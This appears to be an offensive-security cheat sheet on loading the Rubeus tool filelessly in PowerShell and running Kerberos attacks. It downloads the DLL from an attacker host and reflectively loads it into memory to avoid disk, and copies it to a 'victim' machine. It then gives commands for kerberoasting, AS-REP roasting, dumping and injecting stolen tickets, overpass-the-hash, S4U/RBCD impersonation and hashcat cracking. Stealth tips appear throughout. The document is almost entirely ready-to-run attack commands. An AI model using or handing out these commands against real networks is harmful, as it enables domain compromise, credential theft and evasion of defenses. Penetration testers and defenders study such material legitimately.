# Rubeus — In-Memory Loading & Full Workflow

Rubeus.dll is in `05-lateral-movement/windows/Rubeus.dll`. This file documents how to load it without touching disk and the key command workflows.

---

## Method 1: Load Rubeus.dll via Reflection (Fileless)

```powershell
# Download and load Rubeus.dll directly into memory:
$data = (New-Object Net.WebClient).DownloadData('http://192.168.45.202/Rubeus.dll')
$assem = [System.Reflection.Assembly]::Load($data)

# Get the entry point and invoke:
$type = $assem.GetType('Rubeus.Program')
$method = $type.GetMethod('Main')

# Kerberoast:
$method.Invoke($null, @(,[string[]]@('kerberoast', '/outfile:hashes.txt')))

# AS-REP roasting:
$method.Invoke($null, @(,[string[]]@('asreproast', '/outfile:asrep.txt')))

# Dump tickets:
$method.Invoke($null, @(,[string[]]@('dump', '/nowrap')))

# Overpass-the-Hash (inject TGT):
$method.Invoke($null, @(,[string[]]@('asktgt', '/user:Administrator', '/ntlm:NTHASH', '/domain:corp.com', '/ptt')))

# Pass-the-Ticket:
$method.Invoke($null, @(,[string[]]@('ptt', '/ticket:BASE64_TICKET')))

# Triage (list all tickets):
$method.Invoke($null, @(,[string[]]@('triage')))
```

## Method 2: Load from Local File (If Already on Disk)

```powershell
# Load from current directory:
[System.Reflection.Assembly]::LoadFile("$PWD\Rubeus.dll")
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt".Split())

# Load from a specific path:
[System.Reflection.Assembly]::LoadFile("C:\Windows\Temp\Rubeus.dll")
[Rubeus.Program]::Main("triage".Split())
```

## Method 3: Load From Local Rubeus.dll in This Repo (On Victim)

```powershell
# Copy Rubeus.dll from your Kali share to victim:
copy \\192.168.45.202\share\Rubeus.dll C:\Windows\Temp\r.dll

# Load and run:
[System.Reflection.Assembly]::LoadFile("C:\Windows\Temp\r.dll")
[Rubeus.Program]::Main(@('kerberoast', '/outfile:C:\Windows\Temp\h.txt'))
```

---

## Core Rubeus Commands

### Ticket Operations

```powershell
# List all tickets in current session:
.\Rubeus.exe triage

# Dump all tickets (base64 encoded — ready for ptt):
.\Rubeus.exe dump /nowrap

# Dump tickets for specific user:
.\Rubeus.exe dump /user:Administrator /nowrap

# Inject a ticket (base64 .kirbi):
.\Rubeus.exe ptt /ticket:<base64>

# Import .kirbi file:
.\Rubeus.exe ptt /ticket:C:\ticket.kirbi

# Purge all tickets (clean before injecting):
.\Rubeus.exe purge

# Renew a ticket before expiry:
.\Rubeus.exe renew /ticket:<base64> /ptt
```

### Credential Attacks

```powershell
# Kerberoasting — request TGS for all SPNs:
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Kerberoast a specific user:
.\Rubeus.exe kerberoast /user:sqlsvc /outfile:sqlsvc.txt

# AS-REP roasting — targets with PreAuth disabled:
.\Rubeus.exe asreproast /outfile:asrep.txt

# AS-REP roast specific user:
.\Rubeus.exe asreproast /user:user1 /format:hashcat /outfile:asrep.txt

# Crack on Kali:
# hashcat -m 13100 kerberoast.txt rockyou.txt
# hashcat -m 18200 asrep.txt rockyou.txt
```

### Overpass-the-Hash (NTLM → Kerberos TGT)

```powershell
# Get TGT from NTLM hash (inject into current session):
.\Rubeus.exe asktgt /user:Administrator /ntlm:NTHASH /domain:corp.com /ptt

# Get TGT with AES256 (stealthier):
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256KEY /domain:corp.com /ptt

# Get TGT but don't inject — export as base64:
.\Rubeus.exe asktgt /user:Administrator /ntlm:NTHASH /domain:corp.com /nowrap

# Get TGT to a file:
.\Rubeus.exe asktgt /user:Administrator /ntlm:NTHASH /domain:corp.com /outfile:admin.kirbi

# Verify after injection:
klist
.\Rubeus.exe triage
```

### S4U Attacks (Constrained Delegation / RBCD)

```powershell
# Request service ticket on behalf of another user (Constrained Delegation):
.\Rubeus.exe s4u /ticket:<TGT_base64> /impersonateuser:Administrator /msdsspn:cifs/target.corp.com /ptt

# Full S4U2Self + S4U2Proxy chain:
.\Rubeus.exe s4u /user:svc_account /aes256:AES256KEY /impersonateuser:Administrator \
    /msdsspn:cifs/target.corp.com /domain:corp.com /ptt

# RBCD attack (when you control a machine account):
.\Rubeus.exe s4u /user:FakeMachine$ /aes256:AES256KEY /impersonateuser:Administrator \
    /msdsspn:cifs/victim.corp.com /altservice:ldap /domain:corp.com /ptt
```

### Unconstrained Delegation — Monitor for TGTs

```powershell
# On a machine with Unconstrained Delegation — monitor for incoming TGTs:
.\Rubeus.exe monitor /interval:5 /nowrap

# Wait for a high-privilege user to authenticate to this machine
# → Their TGT appears in output → inject it:
.\Rubeus.exe ptt /ticket:<captured_base64_TGT>
```

---

## Cracking Hashes from Rubeus Output

```bash
# Kerberoast (TGS-REP):
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# AS-REP roast:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# If wordlist fails, use rules:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Quick Decision: Which Command to Use When

```
Situation                              Command
──────────────────────────────────────────────────────────────
Got NTLM hash, need Kerberos auth      asktgt /ntlm: /ptt
Got AES key (stealthy)                 asktgt /aes256: /ptt
Need to roast all service accounts     kerberoast
Specific user has a weak SPN           kerberoast /user:
Users without PreAuth                  asreproast
See what tickets exist                 triage
Steal a ticket from another session    dump /luid: /nowrap
Inject stolen/crafted ticket           ptt /ticket:
Machine has constrained delegation     s4u
Unconstrained delegation machine       monitor /interval:5
```
